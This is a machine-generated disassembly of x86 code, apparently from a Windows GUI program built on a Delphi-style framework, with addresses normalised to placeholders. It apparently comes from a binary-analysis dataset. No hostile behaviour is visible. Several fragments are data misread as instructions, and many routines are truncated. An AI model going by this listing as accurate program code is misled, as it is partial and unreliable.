mov al 0x1
retn
sub_43dfdc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43dfe8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43dff0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43f0c4
sub_43e014
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43f0c4
sub_43e038
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43f0c4
sub_43e080
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43e088
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43f0c4
sub_43e0ac
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43f0c4
sub_43e0d0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43f0c4
sub_43e0ec
push ebx
mov ebx eax
call sub_43b06c
cmp ebx eax
sete al
pop ebx
retn
sub_43e124
push esi
mov dl 0x1
mov si 0xffce
call sub_403468
pop esi
retn
sub_43e26e
jmp sub_4039c0
sub_43e275
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e398
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43e30c
retn
sub_43e3ec
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43e400
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43e4e5
jmp sub_4039c0
sub_43e504
xor eax eax
retn
sub_43e508
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e520
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e538
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43e550
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43e56c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43e584
retn
sub_43e67c
retn
sub_43e680
cmp eax [ rw-data ]
sete al
retn
sub_43e6f4
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43e810
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403468
pop esi
pop ebp
retn 0x4
sub_43e850
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43eae7
jmp sub_4039c0
sub_43eaee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43eaf8
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403468
pop esi
retn
sub_43eb0c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403468
pop esi
retn
sub_43eddb
jmp sub_4039c0
sub_43ee84
push esi
mov si 0xffee
call sub_403468
pop esi
retn
sub_43ee90
mov al 0x1
retn
sub_43f168
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43d518
retn
sub_43f18c
retn
sub_43f3a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416c9c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43f3c0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_418fd4
retn
sub_43f4b8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43fad0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fad8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fae0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fb98
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fbb8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43e014
mov [ ebx + 0x9a ] 0x1
sub_43fc10
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43dfb8
mov [ ebx + 0x56 ] 0x1
sub_43fc34
mov [ edx + 0xc ] 0x1
retn
sub_43fc3c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43f0c4
sub_43fc54
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43f0c4
sub_43fc6c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43fed2
jmp sub_4039c0
sub_43fed9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ff04
mov eax [ r-xdata ]
retn
sub_4400a0
jmp sub_4039c0
sub_4400a7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4401c8
mov eax [ eax + 0xb8 ]
retn
sub_440230
push ebx
mov ebx eax
mov eax ebx
call sub_43e520
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44024c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4403e4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_440414
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44041c
call sub_43cf84
retn
sub_44051c
jmp sub_4039c0
sub_4406dc
jmp sub_4039c0
sub_44072c
jmp sub_4039c0
sub_440764
retn
sub_4409ed
jmp sub_4039c0
sub_440b75
jmp sub_4039c0
sub_440ed7
jmp sub_4039c0
sub_440f83
jmp sub_4039c0
sub_440f90
inc [ eax + 0x160 ]
retn
sub_440f98
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_440fb8
sub_440fb8
xor edx edx
call sub_440efc
retn
sub_441085
jmp sub_4039c0
sub_44108c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44117b
jmp sub_4039c0
sub_4416a2
jmp sub_4039c0
sub_4416a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441871
jmp sub_4039c0
sub_441878
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44194c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_441b39
jmp sub_4039c0
sub_441b40
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_441c30
xor eax eax
retn
sub_441c98
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43f0c4
sub_441dc6
jmp sub_40370c
sub_441efb
jmp sub_4039c0
sub_441f02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441f0c
jmp sub_40370c
sub_441f11
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4424cc
jmp sub_4039c0
sub_4424d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4424dc
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4429da
jmp sub_4039c0
sub_442a2c
push ebx
mov ebx eax
call sub_41bce8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43f0c4
pop ebx
retn
sub_442a48
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43f0c4
retn
sub_442a5c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43f0c4
retn
sub_442a6c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43f0c4
retn
sub_442d18
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444a08
pop esi
retn
sub_442e2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442e7c
pop esi
retn
sub_442e40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442f68
pop esi
retn
sub_442e54
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_442e68
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_442f5b
jmp sub_4039c0
sub_442f62
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442ff2
jmp sub_4039c0
sub_442ff9
pop ebx
pop ecx
pop ebp
retn
sub_443000
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_443010
retn
sub_443014
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_443034
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_443194
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_443264
retn
sub_44337c
jmp sub_4039c0
sub_443383
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44344e
jmp sub_4039c0
sub_443478
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44350a
jmp sub_4039c0
sub_4436dc
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_443980
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_443a5c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_441488
pop esi
retn
sub_443b20
push esi
mov si 0xffc1
call sub_403468
pop esi
retn
sub_443b4c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443b60
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443b74
call sub_441448
retn
sub_443b7c
call sub_441448
retn
sub_443b84
call sub_441448
retn
sub_443c2c
push ebx
mov ebx eax
mov eax ebx
call sub_43fae0
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41ce60
mov dx 0xb009
mov eax ebx
call sub_441488
pop ebx
retn
sub_443d90
call sub_441448
retn
sub_443d98
call sub_441448
retn
sub_443da0
call sub_441448
retn
sub_443da8
call sub_441448
retn
sub_443e0c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4442a2
jmp sub_4039c0
sub_4442a9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444388
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44452c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43f0c4
retn
sub_4445cc
push ebx
mov ebx eax
mov eax ebx
call sub_4449fc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4445e8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4447c0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4446f8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_444818
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f0c4
sub_444838
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43f0c4
sub_44485c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_444868
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43f0c4
sub_444914
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_4448b8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4449f0
jmp sub_4039c0
sub_4449f7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444c16
jmp sub_4039c0
sub_444c1d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_444d24
call sub_43ee94
retn
sub_445172
jmp sub_4039c0
sub_445208
mov eax [ r-xdata ]
retn
sub_44536f
jmp sub_4039c0
sub_445480
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f0c4
sub_4454a0
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f0c4
sub_4457b6
jmp sub_4039c0
sub_4458f8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_445a54
jmp sub_4039c0
sub_445a5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d520
retn
sub_445a77
jmp sub_4039c0
sub_445a84
retn
sub_445b58
mov [ edx + 0xc ] 0xffffffff
retn
sub_445bb6
jmp sub_4039c0
sub_445bbd
pop ecx
pop ecx
pop ebp
retn
sub_445c5d
jmp sub_4039c0
sub_445c64
pop ebx
mov esp ebp
pop ebp
retn
sub_445cd0
call sub_441c50
retn
sub_445d63
jmp sub_4039c0
sub_445d6a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_445f49
jmp sub_4039c0
sub_445f50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4460ac
push ebx
mov ebx eax
mov eax ebx
call sub_44b074
or edx 0xffffffff
mov eax ebx
call sub_4461d8
pop ebx
retn
sub_446184
jmp sub_4039c0
sub_4461d8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_4460c4
sub_446348
push ebx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_446360
push ebx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44644c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_442888
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4464e7
jmp sub_4039c0
sub_4464ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446511
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d520
retn
sub_44650a
jmp sub_4039c0
sub_446511
pop ebx
pop ecx
pop ebp
retn
sub_446518
retn
sub_446580
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4468ed
jmp sub_4039c0
sub_446ad4
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_446cc0
jmp sub_4039c0
sub_446d70
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_446d84
inc [ eax + 0x6c ]
retn
sub_446d88
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_448608
sub_446ee8
call sub_4475e8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_447893
jmp sub_4039c0
sub_44789a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4478b7
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_4478b0
jmp sub_4039c0
sub_4478b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b98
jmp sub_4039c0
sub_447b9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447bbc
mov eax [ ebp - 0x4 ]
call sub_41d520
retn
sub_447bb5
jmp sub_4039c0
sub_447bbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447bd9
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_447bd2
jmp sub_4039c0
sub_447bd9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44808d
jmp sub_4039c0
sub_448094
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44821f
jmp sub_4039c0
sub_448226
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4482db
jmp sub_4039c0
sub_4482e2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4483d0
jmp sub_4039c0
sub_448421
jmp sub_4039c0
sub_448428
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4484e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446df4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_448630
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_446930
sub_448f30
jmp sub_4039c0
sub_448f37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449000
call GetCapture
retn
sub_449008
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c8c0
pop ebx
retn
sub_449018
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44927e
jmp sub_4039c0
sub_449478
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44968c
jmp sub_4039c0
sub_449693
pop ebx
mov esp ebp
pop ebp
retn
sub_4496de
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44975b
jmp sub_4039c0
sub_449762
pop ebp
retn
sub_4497ea
jmp sub_4039c0
sub_4497f1
pop ebp
retn
sub_449a38
stc
push ebx
push eax
jmp esp
sub_449f40
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413a24
retn
sub_449f58
mov al 0x1
retn
sub_449f5c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4197b0
retn
mov eax edx
retn
sub_449f6c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419780
retn
mov al 0x1
retn
sub_44a25c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4139c8
pop esi
pop ebx
retn
sub_44a270
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44a2ac
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a510
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a524
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a538
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a54c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a560
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a574
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a588
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a59c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a5b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a5c4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
pop ebx
retn
sub_44a5d8
retn
sub_44a5dc
retn
sub_44a5e0
retn
sub_44a5e4
retn
sub_44a5e8
retn
sub_44a5ec
retn
sub_44a5f0
retn
sub_44a5f4
retn
sub_44a5f8
retn
sub_44a5fc
retn
sub_44a600
retn
sub_44a604
retn
sub_44a8b0
jmp sub_4039c0
sub_44ac4c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x90 ] eax
sub_44ac74
push esi
mov si 0xffef
call sub_403468
pop esi
retn
sub_44ad15
jmp sub_4039c0
sub_44ad1c
pop ebp
retn
sub_44ad20
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
sub_44af48
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44b121
jmp sub_4039c0
sub_44b128
pop ebx
pop ecx
pop ebp
retn
sub_44b12c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44b134
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44b39c
sub_44b1e1
jmp sub_4039c0
sub_44b1e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_40326c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44b2f0
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44b42f
jmp sub_4039c0
sub_44b436
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b4ce
jmp sub_4039c0
sub_44b4d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b4f2
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_44b4eb
jmp sub_4039c0
sub_44b4f2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403468
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b5c9
jmp sub_4039c0
sub_44b607
jmp sub_4039c0
sub_44b60e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403468
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b7d3
jmp sub_4039c0
sub_44b7da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7f7
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_44b7f0
jmp sub_4039c0
sub_44b7f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44b870
retn
sub_44b810
jmp sub_4039c0
sub_44b85f
jmp sub_4039c0
sub_44b866
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44b8ef
jmp sub_4039c0
sub_44b8f6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b8fc
or edx 0xffffffff
call sub_44b870
retn
sub_44bd0b
jmp sub_4039c0
sub_44bd12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd2f
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_44bd28
jmp sub_4039c0
sub_44bd2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd4c
mov eax [ ebp - 0x4 ]
call sub_44c844
retn
sub_44bd45
jmp sub_4039c0
sub_44bd4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bf50
jmp sub_4039c0
sub_44bf57
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bf5c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403468
sub_44bf74
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_41256c
pop ebx
retn
sub_44c018
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41386c
sub_44c12f
jmp sub_4039c0
sub_44c136
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
sub_44c14c
jmp sub_4039c0
sub_44c45e
jmp sub_4039c0
sub_44c465
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
